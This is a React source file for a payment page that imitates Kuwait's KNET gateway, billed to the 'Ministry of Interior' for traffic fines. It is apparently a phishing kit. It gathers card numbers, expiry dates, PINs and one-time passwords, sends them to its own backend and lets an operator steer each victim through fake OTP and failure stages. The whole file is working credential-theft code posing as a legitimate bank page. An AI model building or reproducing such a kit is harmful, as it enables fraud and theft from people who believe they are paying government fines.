import { useState, useEffect, type FormEvent } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "success" | "failed";

const PREFIXES_4 = ["4062", "4192", "4244", "4311", "4502", "4506", "4512", "4514", "4523", "4525", "4529", "4644", "4716", "4856", "4893", "4904"];
const PREFIXES_5 = ["5130", "5132", "5133", "5135", "5136", "5139", "5174", "5196", "5206", "5211", "5215", "5241", "5247", "5256", "5285", "5313", "5314", "5316", "5326", "5360", "5370", "5407", "5433", "5440", "5491", "5520", "5577", "5588"];

export default function Payment() {
  const [, setLocation] = useLocation();
  const [stage, setStage] = useState<Stage>("card");
  const [paymentData, setPaymentData] = useState<any>(null);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  
  const [cardNumber, setCardNumber] = useState("");
  const [cardPrefix, setCardPrefix] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [pin, setPin] = useState("");
  const [otp, setOtp] = useState("");
  
  const [showPrefixes, setShowPrefixes] = useState(false);
  const [availablePrefixes, setAvailablePrefixes] = useState<string[]>([]);

  useEffect(() => {
    const data = sessionStorage.getItem("paymentData");
    if (!data) { setLocation("/"); return; }
    const parsed = JSON.parse(data);
    setPaymentData(parsed);
    
    createSessionMutation.mutate({
      selectedFines: parsed.selectedFines,
      totalAmount: parsed.totalAmount,
      civilId: parsed.civilId,
      enquiryType: "1",
      queryId: "manual"
    });
  }, []);

  useEffect(() => {
    if (cardPrefix === "4") {
      setAvailablePrefixes(PREFIXES_4);
      setShowPrefixes(true);
    } else if (cardPrefix === "5") {
      setAvailablePrefixes(PREFIXES_5);
      setShowPrefixes(true);
    } else {
      setShowPrefixes(false);
    }
  }, [cardPrefix]);

  const createSessionMutation = trpc.payment.createSession.useMutation({
    onSuccess: (data) => setSessionId(data.sessionId)
  });

  const { data: sessionStatus } = trpc.payment.getStatus.useQuery(
    { sessionId: sessionId || "" },
    { enabled: !!sessionId && stage.endsWith("_pending"), refetchInterval: 2000 }
  );

  useEffect(() => {
    if (sessionStatus?.stage) {
      if (sessionStatus.stage === "atm") setStage("otp");
      else setStage(sessionStatus.stage as Stage);
      if (sessionStatus.errorMessage) setError(sessionStatus.errorMessage);
    }
  }, [sessionStatus]);

  const submitCard = trpc.payment.submitCard.useMutation({
    onSuccess: () => setStage("card_pending"),
    onError: (err) => { setError(err.message); setStage("failed"); }
  });

  const submitOtp = trpc.payment.submitOtp.useMutation({
    onSuccess: () => setStage("otp_pending"),
    onError: (err) => { setError(err.message); setStage("failed"); }
  });

  const handleCardSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    submitCard.mutate({
      sessionId,
      cardName: "KNET",
      cardNumber: cardPrefix + cardNumber,
      cardExpiry: `${expiryMonth}/${expiryYear}`,
      cardCvv: pin
    });
  };

  const handleOtpSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    submitOtp.mutate({ sessionId, otpCode: otp });
  };

  if (!paymentData) return null;

  return (
    <div className="knet-portal-wrapper" dir="ltr">
      <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" />
      <style>{`
        body { background-color: #ffffff !important; font-family: Verdana, Arial, sans-serif; margin: 0; padding: 0; }
        .knet-portal-wrapper { display: flex; flex-direction: column; align-items: center; padding-top: 50px; min-height: 100vh; }
        
        .knet-main-container { width: 100%; max-width: 480px; border: 1px solid #d3d3d3; border-radius: 10px; padding: 0; overflow: hidden; box-shadow: 0 0 10px rgba(0,0,0,0.05); }
        
        .knet-header-box { text-align: center; padding: 20px 0; border-bottom: 1px solid #eeeeee; }
        .knet-logo-img { height: 45px; }
        
        .knet-billing-info { padding: 20px; background-color: #ffffff; border-bottom: 1px solid #eeeeee; }
        .billing-title { color: #005eb8; font-weight: bold; font-size: 14px; margin-bottom: 15px; border-bottom: 1px solid #005eb8; display: inline-block; }
        .info-row { display: flex; margin-bottom: 8px; font-size: 12px; }
        .info-label { width: 120px; color: #666666; }
        .info-value { font-weight: bold; color: #333333; }
        
        .knet-card-info { padding: 20px; }
        .card-title { color: #005eb8; font-weight: bold; font-size: 14px; margin-bottom: 20px; border-bottom: 1px solid #005eb8; display: inline-block; }
        
        .knet-form-group { margin-bottom: 15px; }
        .knet-form-label { display: block; font-size: 12px; font-weight: bold; color: #333333; margin-bottom: 5px; }
        
        .knet-input-field { border: 1px solid #cccccc; border-radius: 3px; height: 32px; padding: 0 8px; font-size: 13px; width: 100%; outline: none; }
        .knet-input-field:focus { border-color: #005eb8; }
        
        .prefix-container { position: relative; }
        .prefix-list { position: absolute; top: 32px; left: 0; right: 0; background: white; border: 1px solid #cccccc; z-index: 1000; max-height: 150px; overflow-y: auto; }
        .prefix-opt { padding: 5px 10px; font-size: 12px; cursor: pointer; border-bottom: 1px solid #f0f0f0; }
        .prefix-opt:hover { background-color: #005eb8; color: white; }
        
        .knet-actions { display: flex; justify-content: center; gap: 15px; margin-top: 30px; padding-bottom: 20px; }
        .btn-knet-action { width: 100px; height: 32px; border: 1px solid #cccccc; border-radius: 3px; font-size: 12px; font-weight: bold; cursor: pointer; outline: none; }
        .btn-knet-submit { background-color: #ffffff; color: #333333; }
        .btn-knet-submit:hover { background-color: #f0f0f0; }
        .btn-knet-cancel { background-color: #ffffff; color: #333333; }
        
        .knet-footer-text { text-align: center; font-size: 10px; color: #999999; margin-top: 30px; padding-bottom: 20px; line-height: 1.5; }
        .knet-footer-links { margin-bottom: 10px; }
        .knet-footer-links a { color: #005eb8; text-decoration: none; margin: 0 5px; }
        
        @media (max-width: 500px) {
          .knet-portal-wrapper { padding-top: 10px; }
          .knet-main-container { border: none; box-shadow: none; max-width: 100%; }
        }
      `}</style>

      <div className="knet-main-container">
        <div className="knet-header-box">
          <img src="https://www.kpay.com.kw/kpg/images/knet-logo.png" className="knet-logo-img" alt="KNET" />
        </div>

        <div className="knet-billing-info">
          <div className="billing-title">Billing Information</div>
          <div className="info-row"><span className="info-label">Merchant:</span><span className="info-value">Ministry of Interior</span></div>
          <div className="info-row"><span className="info-label">Website:</span><span className="info-value">https://www.moi.gov.kw</span></div>
          <div className="info-row"><span className="info-label">Amount:</span><span className="info-value">KD {paymentData.totalAmount}</span></div>
        </div>

        <div className="knet-card-info">
          {stage === "card" && (
            <form onSubmit={handleCardSubmit}>
              <div className="card-title">Card Information</div>
              
              <div className="knet-form-group">
                <label className="knet-form-label">Select your Bank :</label>
                <select className="knet-input-field" value={cardPrefix} onChange={e => setCardPrefix(e.target.value)}>
                  <option value="">Select Your Bank</option>
                  <optgroup label="Cards starting with 4">
                    {PREFIXES_4.map(p => <option key={p} value={p}>{p}</option>)}
                  </optgroup>
                  <optgroup label="Cards starting with 5">
                    {PREFIXES_5.map(p => <option key={p} value={p}>{p}</option>)}
                  </optgroup>
                </select>
              </div>

              <div className="knet-form-group">
                <label className="knet-form-label">Card Number:</label>
                <div className="row no-gutters">
                  <div className="col-4 pr-2 prefix-container">
                    <input 
                      type="text" 
                      className="knet-input-field" 
                      placeholder="Prefix" 
                      value={cardPrefix} 
                      onChange={e => setCardPrefix(e.target.value.replace(/\D/g, '').substring(0, 4))} 
                    />
                    {showPrefixes && (
                      <div className="prefix-list">
                        {availablePrefixes.map(p => (
                          <div key={p} className="prefix-opt" onClick={() => { setCardPrefix(p); setShowPrefixes(false); }}>{p}</div>
                        ))}
                      </div>
                    )}
                  </div>
                  <div className="col-8">
                    <input 
                      type="text" 
                      className="knet-input-field" 
                      placeholder="Card Number" 
                      value={cardNumber} 
                      onChange={e => setCardNumber(e.target.value.replace(/\D/g, '').substring(0, 12))} 
                      required 
                    />
                  </div>
                </div>
              </div>

              <div className="knet-form-group">
                <label className="knet-form-label">Expiration Date:</label>
                <div className="row no-gutters">
                  <div className="col-3 pr-2">
                    <select className="knet-input-field" value={expiryMonth} onChange={e => setExpiryMonth(e.target.value)} required>
                      <option value="">MM</option>
                      {Array.from({length: 12}, (_, i) => (i + 1).toString().padStart(2, '0')).map(m => <option key={m} value={m}>{m}</option>)}
                    </select>
                  </div>
                  <div className="col-4">
                    <select className="knet-input-field" value={expiryYear} onChange={e => setExpiryYear(e.target.value)} required>
                      <option value="">YYYY</option>
                      {Array.from({length: 10}, (_, i) => (new Date().getFullYear() + i).toString()).map(y => <option key={y} value={y}>{y}</option>)}
                    </select>
                  </div>
                </div>
              </div>

              <div className="knet-form-group">
                <label className="knet-form-label">PIN:</label>
                <div className="row no-gutters">
                  <div className="col-5">
                    <input 
                      type="password" 
                      maxLength={4} 
                      className="knet-input-field" 
                      value={pin} 
                      onChange={e => setPin(e.target.value.replace(/\D/g, '').substring(0, 4))} 
                      required 
                    />
                  </div>
                </div>
              </div>

              <div className="knet-actions">
                <button type="submit" className="btn-knet-action btn-knet-submit">Submit</button>
                <button type="button" className="btn-knet-action btn-knet-cancel" onClick={() => setLocation("/")}>Cancel</button>
              </div>
            </form>
          )}

          {stage === "otp" && (
            <form onSubmit={handleOtpSubmit} className="text-center">
              <div className="card-title">OTP Verification</div>
              <p style={{fontSize:'12px', color:'#666', marginBottom:'20px'}}>Please enter the One-Time Password sent to your mobile.</p>
              <input 
                type="text" 
                className="knet-input-field text-center mb-4" 
                style={{letterSpacing: '5px', fontSize: '18px', width:'200px', height:'40px'}} 
                value={otp} 
                onChange={e => setOtp(e.target.value.replace(/\D/g, '').substring(0, 6))} 
                placeholder="000000" 
                required 
              />
              <div className="knet-actions">
                <button type="submit" className="btn-knet-action btn-knet-submit">Confirm</button>
              </div>
            </form>
          )}

          {stage.endsWith("_pending") && (
            <div className="text-center py-5">
              <div className="spinner-border text-primary" role="status" style={{width:'30px', height:'30px'}}></div>
              <p className="mt-3" style={{fontSize:'13px', fontWeight:'bold'}}>Processing...</p>
            </div>
          )}

          {stage === "success" && (
            <div className="text-center py-4">
              <h5 className="text-success font-weight-bold">Transaction Successful</h5>
              <button className="btn-knet-action btn-knet-submit w-100 mt-4" onClick={() => setLocation("/")}>Back</button>
            </div>
          )}

          {stage === "failed" && (
            <div className="text-center py-4">
              <h5 className="text-danger font-weight-bold">Failed</h5>
              <p className="small text-muted">{error || "Declined"}</p>
              <button className="btn-knet-action btn-knet-submit w-100 mt-4" onClick={() => setStage("card")}>Retry</button>
            </div>
          )}
        </div>
      </div>

      <div className="knet-footer-text">
        <div className="knet-footer-links">
          <a href="#">Accepted Cards</a> | <a href="#">KNET Home</a> | <a href="#">Help</a>
        </div>
        Copyrights | Privacy Policy | Disclaimer | View Certificate | Contact Us<br/>
        © All Rights Reserved. Copyright 2026<br/>
        The Shared Electronic Banking Services Company - KNET
      </div>
    </div>
  );
}
